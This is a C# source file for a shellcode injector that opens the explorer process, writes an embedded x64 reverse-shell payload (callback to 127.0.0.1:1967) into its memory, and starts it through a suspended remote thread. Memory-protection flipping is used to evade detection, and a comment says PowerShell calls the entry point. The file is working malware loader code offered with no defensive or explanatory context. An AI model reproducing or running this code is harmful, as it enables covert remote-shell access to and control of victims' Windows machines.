using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Injector
{
    public class Program
    {
        // Import all necessary WinAPI functions
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32.dll")] public static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);

        // This is the public method PowerShell will call
        public static void Execute()
        {
            // Shellcode for 127.0.0.1:1967
            byte[] shellcode = new byte[] {
                0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,
                0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,
                0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,
                0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x66,0x81,0x78,
                0x18,0x0B,0x02,0x0F,0x85,0x72,0x00,0x00,0x00,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,
                0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,
                0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,
                0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,
                0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,
                0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,
                0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,
                0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,0x8B,
                0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x49,0xBE,0x77,0x73,0x32,0x5F,0x33,0x32,0x00,
                0x00,0x41,0x56,0x49,0x89,0xE6,0x48,0x81,0xEC,0xA0,0x01,0x00,0x00,0x49,0x89,0xE5,
                0x49,0xBC,0x02,0x00,0x07,0xAF,0x7F,0x00,0x00,0x01,0x41,0x54,0x49,0x89,0xE4,0x4C,
                0x89,0xF1,0x41,0xBA,0x4C,0x77,0x26,0x07,0xFF,0xD5,0x4C,0x89,0xEA,0x6A,0x01,0x59,
                0x41,0xBA,0x3A,0x56,0x79,0xA7,0xFF,0xD5,0x48,0x85,0xC0,0x74,0x0A,0x49,0xFF,0xCE,
                0x75,0xE5,0xE8,0x93,0x00,0x00,0x00,0x48,0x83,0xEC,0x10,0x48,0x89,0xE2,0x4D,0x31,
                0xC9,0x41,0x51,0x48,0x8D,0x42,0x18,0x52,0x41,0xBA,0x86,0x86,0x74,0xEC,0xFF,0xD5,
                0x48,0x89,0xC7,0x6A,0x10,0x41,0x58,0x4C,0x89,0xE2,0x41,0xBA,0x50,0xB5,0xA2,0x56,
                0xFF,0xD5,0x48,0x85,0xC0,0x74,0x0C,0x49,0xFF,0xCE,0x75,0xE5,0x58,0x58,0x41,0x59,
                0x41,0x59,0xFF,0xE0
            };

            // Full Phantom Thread injection logic
            Process targetProcess = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = OpenProcess(0x1F0FFF, false, targetProcess.Id);
            IntPtr allocAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            WriteProcessMemory(hProcess, allocAddress, shellcode, (uint)shellcode.Length, out _);
            VirtualProtectEx(hProcess, allocAddress, (UIntPtr)shellcode.Length, 0x01, out _);
            IntPtr hRemoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocAddress, IntPtr.Zero, 0x00000004, out _);
            Thread.Sleep(3000);
            VirtualProtectEx(hProcess, allocAddress, (UIntPtr)shellcode.Length, 0x20, out _);
            ResumeThread(hRemoteThread);
            CloseHandle(hProcess);
            CloseHandle(hRemoteThread);
        }
    }
}
